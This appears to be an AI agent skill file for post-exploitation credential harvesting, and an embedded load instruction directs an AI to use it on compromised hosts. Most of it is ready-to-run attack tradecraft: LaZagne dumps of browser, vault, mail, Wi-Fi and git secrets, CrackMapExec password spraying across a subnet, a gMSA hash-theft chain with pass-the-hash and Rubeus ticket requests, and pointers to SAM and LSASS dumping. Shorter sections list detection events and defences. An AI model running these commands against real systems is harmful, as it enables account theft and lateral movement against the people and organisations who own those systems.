---
name: credential-harvesting
description: >-
  Post-exploitation credential harvesting. Covers LaZagne multi-source credential extraction,
  service account credential rotation assessment, browser/database/system credential recovery,
  credential validation, and credential-based lateral movement planning.
---

# Credential Harvesting

> **AI LOAD INSTRUCTION**: Use when harvesting credentials from compromised hosts using LaZagne, browser extraction, credential stores, and service account assessment for lateral movement.

## Credential Access with LaZagne

### MITRE ATT&CK Mapping

- **T1555** - Credentials from Password Stores
- **T1555.003** - Credentials from Web Browsers
- **T1555.004** - Windows Credential Manager
- **T1552.001** - Unsecured Credentials: Credentials In Files
- **T1552.002** - Unsecured Credentials: Credentials in Registry
- **T1003.004** - OS Credential Dumping: LSA Secrets

### LaZagne Deployment and Extraction

```powershell
# Pre-compiled executable (Windows)
lazagne.exe all

# Export results as JSON
lazagne.exe all -oJ

# Target specific modules
lazagne.exe browsers    # Chrome, Firefox, Edge, Opera, IE
lazagne.exe windows     # Credential Manager, Vault, DPAPI
lazagne.exe databases   # PostgreSQL, MySQL, SQLite
lazagne.exe mails       # Outlook, Thunderbird
lazagne.exe wifi        # Wi-Fi passwords
lazagne.exe git         # Git credentials
lazagne.exe sysadmin    # PuTTY, WinSCP, FileZilla (requires elevation)
```

### Linux Credential Extraction

```bash
# Full extraction
python3 laZagne.py all

# Browser credentials
python3 laZagne.py browsers

# System credentials (SSH keys, shadow file as root)
python3 laZagne.py sysadmin

# Database credentials
python3 laZagne.py databases
```

### LaZagne Module Coverage (Windows)

| Category | Modules |
|----------|---------|
| Browsers | Chrome, Firefox, Edge, Opera, IE, Brave, Vivaldi |
| Mail | Outlook, Thunderbird, Foxmail |
| Databases | PostgreSQL, MySQL, SQLiteDB, Robomongo |
| Sysadmin | PuTTY, WinSCP, FileZilla, OpenSSH, RDPManager |
| Windows | Credential Manager, Vault, DPAPI, AutoLogon |
| Wi-Fi | Stored Wi-Fi passwords |
| Git | Git credential store, Git Credential Manager |

### Credential Analysis and Prioritization

```python
import json
with open("creds.json") as f:
    results = json.load(f)
for module in results:
    for entry in module.get("results", []):
        print(f"Source: {entry.get('Category')}")
        print(f"  User: {entry.get('Login', 'N/A')}")
        print(f"  URL/Host: {entry.get('URL', entry.get('Host', 'N/A'))}")
```

**Priority order for harvested credentials:**
1. Domain credentials (AD accounts) for lateral movement
2. Cloud service credentials (AWS, Azure, GCP)
3. VPN and remote access credentials
4. Database credentials for data access
5. Mail credentials for BEC investigation
6. Service account credentials for privilege escalation

### Credential Validation

```bash
# Validate domain credentials with CrackMapExec
crackmapexec smb 10.10.10.0/24 -u recovered_user -p 'recovered_pass'

# Test with Impacket
smbclient.py domain.local/user:'password'@10.10.10.1
```

## Service Account Credential Rotation Assessment

### Discover Stale Service Accounts

```powershell
# Find all service accounts with SPNs
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet,LastLogonDate

# Find accounts with passwords older than 90 days
$threshold = (Get-Date).AddDays(-90)
Get-ADUser -Filter {PasswordLastSet -lt $threshold -and Enabled -eq $true} -Properties PasswordLastSet,ServicePrincipalName |
    Where-Object {$_.ServicePrincipalName} |
    Select-Object Name, PasswordLastSet, ServicePrincipalName
```

### gMSA Assessment

```powershell
# List gMSA accounts (auto-rotated — low risk)
Get-ADServiceAccount -Filter * -Properties *

# Check which principals can retrieve managed password
Get-ADServiceAccount -Identity svc-gmsa -Properties PrincipalsAllowedToRetrieveManagedPassword
```

### gMSA Attack Chain (攻击侧)

gMSA（Group Managed Service Account）的密码由 DC 自动轮换，本无法直接离线破解——但**能够读取 `msDS-ManagedPassword` 的主体**可拿到服务账户当前 NTLM 哈希，实现冒充服务账户（该服务账户常被授予 SPN/高权限，等价于一次受控提权/横向）。

**前置条件**：对目标 gMSA 有 `ReadGMSAPassword` 权限（显式授予），或通过 `GenericAll`/`WriteProperty`/`GenericWrite` 间接取得读取能力（写 `msDS-GroupMSAMembership` 把自己加进允许读取主体）。

```bash
# 1) 枚举可读取的 gMSA（PowerShell / BloodHound / gMSADumper）
Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword |
  Select-Object Name, PrincipalsAllowedToRetrieveManagedPassword

# BloodHound: 查 ReadGMSAPassword 边（Outbound Object Control → ReadGMSAPassword）

# 2) 读取 msDS-ManagedPassword（NTLM 哈希 + 历史哈希）
# gMSADumper（.NET，Windows）
gMSADumper.exe -u <user> -p <pass> -d <domain>

# 或用 Linux 工具 / LDAP 直接读（需对 gMSA 的 ReadGMSAPassword）
python3 gMSADumper.py -u '<user>' -p '<pass>' -d '<domain>'
```

**输出解读**：`msDS-ManagedPassword` 是一个含 `CurrentPassword`（NTLM 哈希）+ `PreviousPasswords`（历史哈希）的加密 BLOB；gMSADumper 解出后给出 `NTHash: <hash>`，可用于 PTH/Overpass 冒充该服务账户。

```bash
# 3) 冒充服务账户（PTH / 请求其 TGT）
# PTH 横向
nxc smb <target> -u 'svc-gmsa$' -H <NTHash>
# 或 Overpass（Rubeus asktgt）
Rubeus.exe asktgt /user:'svc-gmsa$' /rc4:<NTHash> /ptt
```

**检测点**：
| 行为 | 检测 |
|---|---|
| 读取 `msDS-ManagedPassword` | Event 4662（对象访问）+ LDAP 属性读审计（该属性属敏感，正常只有服务主机读取） |
| gMSADumper 执行 | 进程创建（Sysmon Event 1）+ 异常 LDAP 查询模式 |
| 服务账户异常登录 | Event 4624（LogonType 3）+ 服务账户在非常规主机登录 |

**防御**：1) `PrincipalsAllowedToRetrieveManagedPassword` 最小化（仅服务所在主机）2) 审计 `ReadGMSAPassword`/`msDS-ManagedPassword` 读取 3) 服务账户登录位置基线 + 异常告警。

### Service Account Types and Risk

| Type | Platform | Rotation Method | Risk |
|------|----------|----------------|------|
| AD Service Account | Windows/AD | gMSA (auto) or manual | Manual rotation often neglected |
| AWS IAM User | AWS | Secrets Manager Lambda | Access keys may be long-lived |
| GCP Service Account | GCP | IAM API key rotation | JSON key files often committed |
| Azure Service Principal | Azure | Key Vault + policy | Client secrets may not expire |
| Database Account | SQL/Postgres | Vault dynamic secrets | Shared passwords common |

## Credential Harvesting Decision Tree

```
Compromised host obtained
|
+-- Run LaZagne all modules
|   +-- Browser credentials? -> Check for domain admin cookies/sessions
|   +-- Windows Credential Manager? -> Check for saved enterprise creds
|   +-- Git credentials? -> Check for code repository access
|   +-- Database credentials? -> Check for data access
|
+-- Check for additional credential sources
|   +-- SAM database (requires SYSTEM) -> reg save HKLM\SAM
|   +-- LSASS memory (requires SYSTEM/admin) -> Mimikatz/secretsdump
|   +-- DPAPI master keys -> SharpDPAPI
|   +-- Unattended.xml, web.config -> Search for files with passwords
|
+-- Validate harvested credentials
|   +-- Domain credentials -> CrackMapExec spray across subnet
|   +-- Local credentials -> Test for local admin on other hosts
|   +-- Service accounts -> Check for elevated AD permissions
|
+-- Assess service account rotation hygiene
    +-- Find stale passwords (>90 days)
    +-- Identify non-gMSA service accounts
    +-- Report as finding with remediation guidance
```

## Detection Indicators

| Indicator | Detection Method |
|-----------|-----------------|
| LaZagne.exe process execution | Hash-based EDR detection |
| Chrome Login Data SQLite access | File access monitoring |
| DPAPI CryptUnprotectData API calls | API hooking and ETW tracing |
| Windows Credential Manager reads | Event 5379 |
| Bulk credential store enumeration | Behavioral analysis for sequential access |
| Python interpreter accessing credential files | Script block logging and file audit |
